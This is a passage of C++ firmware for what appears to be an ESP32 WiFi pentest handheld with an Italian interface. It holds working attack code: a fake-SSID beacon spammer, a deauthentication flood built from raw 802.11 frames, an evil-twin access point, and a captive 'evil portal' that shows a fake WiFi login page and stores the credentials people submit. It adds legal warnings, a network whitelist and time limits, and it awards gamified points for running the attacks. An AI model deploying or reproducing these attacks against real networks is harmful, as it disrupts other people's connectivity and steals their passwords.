    0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F,
    0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00,
};
constexpr size_t kBeaconTailOffset = 70;
constexpr size_t kBeaconTailLen = kBeaconLen - kBeaconTailOffset;
constexpr size_t kBeaconChannelOffset = 82 - kBeaconTailOffset;

size_t buildBeacon(uint8_t* out, const uint8_t mac[6], const char* ssid,
                   uint8_t ssidLen, uint8_t channel) {
    if (ssidLen > 32) {
        ssidLen = 32;
    }
    memcpy(out, kBeaconTemplate, 38);
    memcpy(&out[10], mac, 6);
    memcpy(&out[16], mac, 6);
    out[37] = ssidLen;
    if (ssidLen > 0) {
        memcpy(&out[38], ssid, ssidLen);
    }
    memcpy(&out[38 + ssidLen], &kBeaconTemplate[kBeaconTailOffset],
           kBeaconTailLen);
    out[38 + ssidLen + kBeaconChannelOffset] = channel;
    return 38 + ssidLen + kBeaconTailLen;
}

const char* const kBeaconNames[] = {
    "Free WiFi",          "Starbucks WiFi",   "Airport Free WiFi",
    "Hotel Guest",        "Casa",             "FASTWEB-1234",
    "TIM-87654321",       "Vodafone-WiFi",    "Wind Tre",
    "iPhone di Mario",    "AndroidAP",        "DIRECT-AB-CD",
    "Printer Setup",      "IoT-Device",       "Test Network",
    "Get Free Internet",  "WiFi Gratis",      "Rete Ospiti",
};

void drawBeaconSpam(const char* ssid, uint8_t channel, uint32_t packets,
                    uint32_t txFail, uint32_t remainingMs) {
    display::clear();
    display::header("Beacon Spam", "WiFi Atks");
    display::text(8, 28, "SSID:", display::kTextDim, 0);
    static std::string ssidText;
    display::text(8, 40,
                  shortenInto(ssidText, ssid != nullptr ? ssid : "", 28),
                  display::kAccent, 2);
    textFormat(8, 62, display::kText, 0, "Canale %u",
               static_cast<unsigned>(channel));
    if (txFail) {
        textFormat(120, 62, display::kWarning, 0, "OK %u KO %u",
                   static_cast<unsigned>(packets), static_cast<unsigned>(txFail));
    } else {
        textFormat(120, 62, display::kText, 0, "OK %u",
                   static_cast<unsigned>(packets));
    }
    display::progressBar(8, 82, 180, 8,
                         1.0f - static_cast<float>(remainingMs) / 60000.0f,
                         display::kDanger);
    display::text(8, 98, "SSID falsi su tutti i canali", display::kWarning, 0);
    display::text(8, 110, "Solo test RF isolati e autorizzati",
                  display::kWarning, 0);
    display::footer("ESC = interrompi (max 60s)");
    display::push();
}

void runBeaconSpam() {
    if (!ui::legalWarning("Beacon Spam",
                          {"Trasmette beacon con SSID falsi.",
                           "Puo' confondere i dispositivi vicini.",
                           "Solo in ambiente RF isolato e autorizzato."},
                          "WiFi")) {
        return;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(150);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        WiFi.mode(WIFI_OFF);
        ui::message("Beacon Spam", {"Modalita' promiscua non disponibile."},
                    "WiFi");
        return;
    }

    uint8_t frame[kBeaconLen];
    uint8_t channel = 1;
    uint32_t sequence = 0;
    uint32_t packets = 0;
    uint32_t txFail = 0;
    uint32_t failRun = 0;
    bool blockedWarned = false;
    constexpr uint32_t kMaxDuration = 60000;
    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    const char* ssid = kBeaconNames[0];

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }

        uint8_t mac[6] = {0};
        esp_fill_random(mac, sizeof(mac));
        mac[0] = static_cast<uint8_t>((mac[0] | 0x02) & 0xFE);
        ssid = kBeaconNames[esp_random() % (sizeof(kBeaconNames) /
                                            sizeof(kBeaconNames[0]))];
        const size_t length =
            buildBeacon(frame, mac, ssid, static_cast<uint8_t>(strlen(ssid)),
                        channel);
        frame[22] = static_cast<uint8_t>(sequence & 0xFF);
        frame[23] = static_cast<uint8_t>(((sequence >> 8) & 0x0F) << 4);
        ++sequence;
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, length, false) == ESP_OK) {
            ++packets;
            failRun = 0;
        } else {
            ++txFail;
            if (++failRun >= 10 && !blockedWarned) {
                blockedWarned = true;
                ui::message("Beacon Spam",
                            {"!TX 802.11 rifiutato dal driver.",
                             "I beacon non partono: canale o", "regione non consentiti."},
                            "WiFi");
            }
        }

        if (((packets + txFail) % 8) == 0) {
            channel = static_cast<uint8_t>(channel % 11 + 1);
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        }

        const uint32_t now = millis();
        if (now - lastDraw > 150) {
            drawBeaconSpam(ssid, channel, packets, txFail,
                           kMaxDuration - (now - start));
            lastDraw = now;
        }
        delay(8);
    }

    stopPromiscuous();
    // Punti mascotte solo se almeno un beacon e' partito.
    if (packets > 0) {
        mascot::award(mascot::Event::WifiBeacon);
    }
    logger::info("Beacon spam terminato: %u frame",
                 static_cast<unsigned>(packets));
}

void drawDeauthFlood(size_t targets, size_t index, uint32_t packets,
                     uint32_t txFail, uint32_t remainingMs, size_t excluded) {
    display::clear();
    display::header("Deauth Flood", "WiFi Atks");
    textFormat(8, 30, display::kText, 2, "Target: %u  WL: %u",
               static_cast<unsigned>(targets), static_cast<unsigned>(excluded));
    textFormat(8, 52, display::kTextDim, 0, "Indice: %u",
               static_cast<unsigned>(index + 1));
    if (txFail) {
        textFormat(8, 66, display::kWarning, 0, "OK %u  KO %u",
                   static_cast<unsigned>(packets), static_cast<unsigned>(txFail));
    } else {
        textFormat(8, 66, display::kText, 0, "OK %u",
                   static_cast<unsigned>(packets));
    }
    display::progressBar(8, 84, 180, 8,
                         1.0f - static_cast<float>(remainingMs) / 60000.0f,
                         display::kDanger);
    display::text(8, 100, "Disconnette tutti i target in range",
                  display::kWarning, 0);
    display::text(8, 112, "Solo reti proprie / autorizzate",
                  display::kWarning, 0);
    display::footer("ESC = interrompi (max 60s)");
    display::push();
}

void runDeauthFlood() {
    if (!collectNetworks(g_networks) || g_networks.empty()) {
        return;
    }
    if (!whitelistReadyOrBlock("WiFi")) {
        return;
    }

    struct Target {
        uint8_t bssid[6];
        uint8_t channel;
    };
    std::vector<Target> targets;
    targets.reserve(24);
    size_t excluded = 0;
    for (const auto& network : g_networks) {
        Target target;
        if (!parseBssid(network.bssid, target.bssid)) {
            continue;
        }
        if (netguard::isProtected(target.bssid, network.ssid.c_str(),
                                  ssidLength(network.ssid))) {
            ++excluded;
            continue;
        }
        target.channel = static_cast<uint8_t>(
            std::min(13, std::max(1, network.channel)));
        targets.push_back(target);
        if (targets.size() >= 24) {
            break;
        }
    }
    if (targets.empty()) {
        ui::message("Deauth Flood",
                    {"Nessun target fuori whitelist.", "Modifica /wifilab/whitelist.txt."},
                    "WiFi");
        return;
    }

    if (!ui::legalWarning("Deauth Flood",
                          {"Invia frame di disconnessione a tutte le reti",
                           "rilevate. Puo' interrompere molti dispositivi.",
                           "Solo su reti tue o con autorizzazione scritta."},
                          "WiFi")) {
        return;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(150);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        WiFi.mode(WIFI_OFF);
        ui::message("Deauth Flood", {"Modalita' promiscua non disponibile."},
                    "WiFi");
        return;
    }

    constexpr uint32_t kMaxDuration = 60000;
    const uint32_t start = millis();
    uint32_t packets = 0;
    uint32_t txFail = 0;
    uint32_t failRun = 0;
    bool blockedWarned = false;
    uint32_t sequence = 0;
    uint32_t lastDraw = 0;
    size_t index = 0;

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }

        const Target& target = targets[index];
        esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
        uint8_t frame[26] = {
            0xC0, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            target.bssid[0], target.bssid[1], target.bssid[2],
            target.bssid[3], target.bssid[4], target.bssid[5],
            target.bssid[0], target.bssid[1], target.bssid[2],
            target.bssid[3], target.bssid[4], target.bssid[5],
            0x00, 0x00,
            0x07, 0x00,
        };
        for (int i = 0; i < 4; ++i) {
            frame[22] = static_cast<uint8_t>(sequence & 0xFF);
            frame[23] = static_cast<uint8_t>(((sequence >> 8) & 0x0F) << 4);
            ++sequence;
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) ==
                ESP_OK) {
                ++packets;
                failRun = 0;
            } else {
                ++txFail;
                if (++failRun >= 10 && !blockedWarned) {
                    blockedWarned = true;
                    ui::message("Deauth Flood",
                                {"!TX 802.11 rifiutato dal driver.",
                                 "I frame non partono: canale o", "regione non consentiti."},
                                "WiFi");
                }
            }
            delay(2);
        }
        index = (index + 1) % targets.size();

        const uint32_t now = millis();
        if (now - lastDraw > 150) {
            drawDeauthFlood(targets.size(), index, packets, txFail,
                            kMaxDuration - (now - start), excluded);
            lastDraw = now;
        }
    }

    stopPromiscuous();
    // Punti mascotte solo se almeno un frame e' partito.
    if (packets > 0) {
        mascot::award(mascot::Event::WifiDeauthFlood);
    }
    logger::info("Deauth flood terminato: %u frame su %u target",
                 static_cast<unsigned>(packets),
                 static_cast<unsigned>(targets.size()));
}

struct CapturedCredential {
    std::string username;
    std::string password;
};

std::vector<CapturedCredential> g_credentials;
// g_credentials e' scritto dal task del server web e letto dal task della UI:
// senza un lock un push_back in corsa con clear() corrompe l'heap.
SemaphoreHandle_t g_credMtx = nullptr;

// Il server HTTP resta allocato per tutta la vita del firmware: end() non
// attende i callback in volo e distruggerlo sarebbe un use-after-free.
AsyncWebServer* g_portalServer = nullptr;
bool g_portalMode = false;
char g_portalRedirect[32] = {0};

void credLock() {
    if (g_credMtx == nullptr) {
        g_credMtx = xSemaphoreCreateMutex();
    }
    if (g_credMtx != nullptr) {
        xSemaphoreTake(g_credMtx, portMAX_DELAY);
    }
}

void credUnlock() {
    if (g_credMtx != nullptr) {
        xSemaphoreGive(g_credMtx);
    }
}

const char kTwinHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Rete Wi-Fi</title>
<style>body{font-family:sans-serif;background:#101820;color:#eee;margin:0}
.card{max-width:420px;margin:60px auto;padding:24px;background:#1b2733;border-radius:12px}
h2{margin-top:0;color:#00d68f}small{color:#93a4b5}</style></head>
<body><div class="card"><h2>Rete Wi-Fi</h2>
<p>Connessione in manutenzione.</p>
<p><small>Ambiente di test autorizzato.</small></p></div></body></html>)HTML";

const char kPortalHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Accesso Wi-Fi</title>
<style>body{font-family:sans-serif;background:#0d1117;color:#e6edf3;margin:0}
.card{max-width:420px;margin:48px auto;padding:24px;background:#161b22;border-radius:12px}
h2{margin-top:0;color:#58a6ff}input{width:100%;box-sizing:border-box;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3}
button{width:100%;padding:12px;border:0;border-radius:8px;background:#238636;color:#fff;font-size:16px}
small{color:#8b949e}</style></head>
<body><div class="card"><h2>Accesso rete Wi-Fi</h2>
<form method="POST" action="/login">
<input name="username" placeholder="Utente o email" autocomplete="off" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Accedi</button>
</form>
<p><small>Portale di test: usare solo su reti proprie o autorizzate.</small></p>
</div></body></html>)HTML";

const char kSuccessHtml[] = R"HTML(<!DOCTYPE html>
<html lang="it"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connessione</title></head>
<body style="font-family:sans-serif;background:#0d1117;color:#e6edf3;text-align:center;padding-top:80px">
<h2 style="color:#3fb950">Connessione in corso</h2>
<p>Attendi mentre verifichiamo i dati.</p></body></html>)HTML";

bool ensurePortalServer() {
    if (g_portalServer != nullptr) {
        return true;
    }
    g_portalServer = new (std::nothrow) AsyncWebServer(80);
    if (g_portalServer == nullptr) {
        return false;
    }
    g_portalServer->on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
        request->send(200, "text/html", g_portalMode ? kPortalHtml : kTwinHtml);
    });
    g_portalServer->on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
        if (!g_portalMode) {
            request->redirect(g_portalRedirect);
            return;
        }
        // Limite esplicito: un AP aperto non deve accumulare form enormi.
        if (request->contentLength() > 1024) {
            request->send(413, "text/plain", "Richiesta troppo grande");
            return;
        }
        CapturedCredential credential;
        if (request->hasArg("username")) {
            credential.username = request->arg("username").substring(0, 63).c_str();
        }
        if (request->hasArg("password")) {
            credential.password = request->arg("password").substring(0, 63).c_str();
        }
        if (!credential.username.empty()) {
            credLock();
            if (g_credentials.size() < 20) {
                g_credentials.push_back(credential);
            }
            credUnlock();
        }
        request->send(200, "text/html", kSuccessHtml);
    });
    g_portalServer->onNotFound([](AsyncWebServerRequest* request) {
        request->redirect(g_portalRedirect);
    });
    return true;
}

void drawAccessPoint(const std::string& title, const Network& target,
                     const IPAddress& ip, int clients, bool portal,
                     uint32_t uptimeMs) {
    display::clear();
    display::header(title, "WiFi");
    display::text(8, 30, "SSID clone:", display::kTextDim, 0);
    static std::string ssidText;
    display::text(8, 42, shortenInto(ssidText, target.ssid, 28),
                  display::kAccent, 2);
    textFormat(8, 64, display::kText, 0, "IP portale: %s",
               ip.toString().c_str());
    textFormat(8, 76, display::kText, 0, "Client: %d", clients);
    if (portal) {
        credLock();
        const size_t credentialCount = g_credentials.size();
        credUnlock();
        textFormat(120, 76, display::kInfo, 0, "Credenziali: %u",
                   static_cast<unsigned>(credentialCount));
    }
    textFormat(8, 90, display::kTextDim, 0, "Uptime: %us",
               static_cast<unsigned>(uptimeMs / 1000));
    display::text(8, 106, "Solo test autorizzati - dati in RAM", display::kWarning,
                  0);
    display::footer("ESC = interrompi AP");
    display::push();
}

void runFakeAccessPoint(const Network& target, bool portal) {
    if (blockIfWhitelisted(target, portal ? "Evil Portal" : "Evil Twin")) {
        return;
    }

    const std::string ssid = target.ssid.empty() ? "WiFi_Test" : target.ssid;
    int channel = target.channel;
    if (channel < 1 || channel > 13) {
        channel = 6;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    delay(60);
    if (!WiFi.softAP(ssid.c_str(), nullptr, channel, 0, 4)) {
        WiFi.mode(WIFI_OFF);
        ui::message(portal ? "Evil Portal" : "Evil Twin",
                    {"Creazione access point non riuscita."}, "WiFi");
        return;
    }

    const IPAddress ip = WiFi.softAPIP();
    DNSServer dns;

    // Mutex creato prima di server.begin(): i callback HTTP non devono
    // correre con la creazione lazy del lock.
    credLock();
    credUnlock();
    if (g_credMtx == nullptr || !ensurePortalServer()) {
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        ui::message(portal ? "Evil Portal" : "Evil Twin",
                    {"Memoria insufficiente per", "il server HTTP."}, "WiFi");
        return;
    }
    g_portalMode = portal;
    std::snprintf(g_portalRedirect, sizeof(g_portalRedirect), "http://%s/",
                  ip.toString().c_str());

    const bool dnsOk = dns.start(53, "*", ip);
    if (!dnsOk) {
        logger::warn("Access point di test: DNS captive non avviato");
    }

    AsyncWebServer& server = *g_portalServer;
    server.begin();

    const uint32_t start = millis();
    uint32_t lastDraw = 0;
    navigation::waitRelease();

    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        if (dnsOk) {
            dns.processNextRequest();
        }
        const uint32_t now = millis();
        if (now - lastDraw > 250) {
            drawAccessPoint(portal ? "Evil Portal" : "Evil Twin", target, ip,
                            WiFi.softAPgetStationNum(), portal, now - start);
            lastDraw = now;
        }
        delay(5);
    }

    // Punti solo a sessione reale: evita di farmare aprendo e chiudendo l'AP.
    if (millis() - start >= 10000) {
        mascot::award(mascot::Event::EvilTwin);
    }
    server.end();
    // Da qui i POST vengono solo rediretti; i callback gia' entrati hanno 250
    // ms per finire, poi si svuota la RAM. Il server non viene distrutto.
    g_portalMode = false;
    const uint32_t graceStart = millis();
    while (millis() - graceStart < 250) {
        delay(5);
    }
    credLock();
    g_credentials.clear();
    credUnlock();
    if (dnsOk) {
        dns.stop();
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    logger::info("Access point di test chiuso");
}

void runEvilTwin() {
    if (!collectNetworks(g_networks) || g_networks.empty()) {
        return;
    }
    std::vector<std::string> labels;
    networkLabels(g_networks, labels);
    const int choice = chooseIndex("SSID da clonare", "WiFi", labels,
                                   "ENTER=seleziona  `=indietro");
    if (choice < 0) {
        return;
    }
    const Network target = g_networks[choice];
    if (blockIfWhitelisted(target, "Evil Twin")) {
        return;
    }
    if (!ui::legalWarning("Evil Twin",
                          {"Crea un access point con lo stesso SSID",
                           "della rete selezionata.",
                           "Solo su reti tue o con autorizzazione scritta."},
                          "WiFi")) {
        return;
    }
    credLock();
    g_credentials.clear();
    credUnlock();
    runFakeAccessPoint(target, false);
}

void runEvilPortal() {
    if (!collectNetworks(g_networks) || g_networks.empty()) {
        return;
    }
    std::vector<std::string> labels;
    networkLabels(g_networks, labels);
    const int choice = chooseIndex("Portale: SSID da usare", "WiFi", labels,
                                   "ENTER=seleziona  `=indietro");
    if (choice < 0) {
        return;
    }
    const Network target = g_networks[choice];
    if (blockIfWhitelisted(target, "Evil Portal")) {
        return;
    }
    if (!ui::legalWarning("Evil Portal",
                          {"Crea un portale web per raccogliere credenziali.",
                           "I dati restano solo in RAM e sono cancellati",
                           "all'uscita. Solo reti proprie o autorizzate."},
                          "WiFi")) {
        return;
    }
    credLock();
    g_credentials.clear();
    credUnlock();
    runFakeAccessPoint(target, true);
}

void runAttacksMenu() {
    MenuManager menu("WiFi Atks", "WiFi");
    menu.addItem("Beacon Spam", "jammer", [] { runBeaconSpam(); });
    menu.addItem("Deauth target", "jammer", [] { runDeauth(); });
    menu.addItem("Deauth Flood", "jammer", [] { runDeauthFlood(); });
    menu.addItem("NetCut / ARP", "jammer", [] { runNetCut(); });
    menu.addItem("Evil Twin", "wifi", [] { runEvilTwin(); });
    menu.addItem("Evil Portal", "portal", [] { runEvilPortal(); });
    menu.setHint("ESC=indietro  ;.=nav  ENTER=apri");
    menu.run(true);
}
#endif  // ENABLE_OFFENSIVE

}  // namespace

void runMenu() {
    MenuManager menu("WiFi", "Menu principale");
    menu.addItem("Scanner reti", "scan", [] { runScanner(); });
    menu.addItem("AP info", "wifi", [] { runApInfo(); });
    menu.addItem("Avvia AP", "wifi", [] { runStartAp(); });
    menu.addItem("Spegni WiFi", "wifi", [] { runWifiOff(); });
    menu.addItem("Scan Hosts", "scan", [] { runScanHosts(); });
    menu.addItem("TCP Listener", "wifi", [] { runTcpListener(); });
    menu.addItem("TCP Client", "wifi", [] { runTcpConsole("TCP Client", 80); });
    menu.addItem("TelNET", "wifi", [] { runTcpConsole("TelNET", 23); });
    menu.addItem("Channel Analyzer", "radar", [] { runChannelAnalyzer(); });
    menu.addItem("Jam Detect", "radar", [] { runJamDetect(); });
    menu.addItem("Sniffer 802.11", "scan", [] { runSniffer(); });
#if ENABLE_OFFENSIVE
    menu.addSeparator("Test sicurezza (solo autorizzati)");
    menu.addItem("WiFi Atks", "jammer", [] { runAttacksMenu(); });
#endif
    menu.setHint("ESC=indietro  ;.=nav  ENTER=apri");
    menu.run(true);
}

}  // namespace wifi

#endif  // ENABLE_MODULE_WIFI
